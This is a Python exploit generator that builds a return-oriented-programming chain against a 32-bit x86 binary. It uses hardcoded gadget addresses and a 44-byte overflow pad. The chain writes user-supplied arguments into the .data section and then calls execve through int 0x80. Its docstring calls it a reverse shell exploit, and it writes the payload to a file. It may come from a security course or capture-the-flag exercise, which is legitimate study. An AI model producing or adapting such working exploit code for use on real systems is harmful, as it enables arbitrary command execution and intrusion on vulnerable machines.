from struct import pack
import os

# Macro definitions for ROP Gadgets
POPEDX    = pack('<I', 0x0806ee8b)
STACK     = pack('<I', 0x080da060)
POPEAX    = pack('<I', 0x080a8bf6)
MOVISTACK = pack('<I', 0x08056d05)
XOREAX    = pack('<I', 0x080562c0)
INCEAX    = pack('<I', 0x0807c32a)
INT80     = pack('<I', 0x08049603)
POPEBX    = pack('<I', 0x080481c9)
POPECXEBX = pack('<I', 0x0806eeb2)

def preprocess(p):
    """Helper function to preprocess command line arguments w.r.t. /

    :param p: The parameter to be preprocessed
    :return: The preprocessed command line argument
    """
    if '/' in p:
        result = ""
        subargs = p.split('/')
        for subarg in subargs:
            if subarg:
                while len(subarg) < 3:
                    subarg = '/' + subarg
                result += '/' + subarg
        return result
    return p

def create_stack_ropchain(cli_args, base_address):
    """Create the stack ROP chain

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The stack ROP chain packed bytes sequence
    """
    p = b''

    offset = 0
    size = len(cli_args)
    for index in range(size):
        if index > 0:
            offset += len(cli_args[index - 1]) + 1
        
        for j in range(len(cli_args[index]) // 4):

            p += POPEDX
            p += pack('<I', base_address + offset + j * 4)

            p += POPEAX
            p += (cli_args[index][j * 4 : (j + 1) * 4]).encode('utf-8')
            p += MOVISTACK
        
        p += POPEDX
        p += pack('<I', base_address + offset + len(cli_args[index]))

        p += XOREAX
        p += MOVISTACK
    
    return p


def create_shadow_stack_ropchain(cli_args, base_address, shadow_stack_offset):
    """Create the shadow stack ROP chain

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :param shadow_stack_offset: The offset used from the .data address to create the shadow stack
    :return: The shadow stack ROP chain packed bytes sequence
    """
    p = b''

    args_offset = 0
    shadow_offset = 0
    size = len(cli_args)
    
    for index in range(size):
        p += POPEDX
        p += pack('<I', base_address + shadow_stack_offset + shadow_offset)

        p += POPEAX
        p += pack('<i', base_address + args_offset)
        p += MOVISTACK

        shadow_offset += 4
        args_offset += len(cli_args[index]) + 1
    
    return p

def rop_exploit(cli_args, base_address):
    """Create the full ROP chain reverse shell exploit

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The full ROP chain reverse shell exploit packed bytes sequence
    """
    p = b'\x41' * 44

    p += create_stack_ropchain(cli_args, base_address)

    p += POPEBX # pop ebx ; ret
    p += STACK # @ .data

    p += create_shadow_stack_ropchain(cli_args, base_address, 60)

    p += POPECXEBX # pop ecx ; pop ebx ; ret
    p += pack('<I', 0x080da060 + 60) # @ .data + 60
    p += pack('<I', 0x080da060) # padding without overwrite ebx

    p += POPEDX # pop edx ; ret
    p += pack('<I', 0x080da060 + 48) # @ .data + 48

    p += XOREAX # xor eax, eax ; ret
    p += INCEAX * 11 # inc eax ; ret 11 times
    p += INT80 # int 0x80

    return p

def test():
    params = input("Enter exploit parameters: ")
    args = []
    for arg in params.split():
        args.append(preprocess(arg))

    fileName=input("Enter the file name: ")
    outfile=open(fileName, "wb")
    outfile.write(rop_exploit(args, 0x080da060))
    outfile.close()


if __name__ == "__main__":
    test()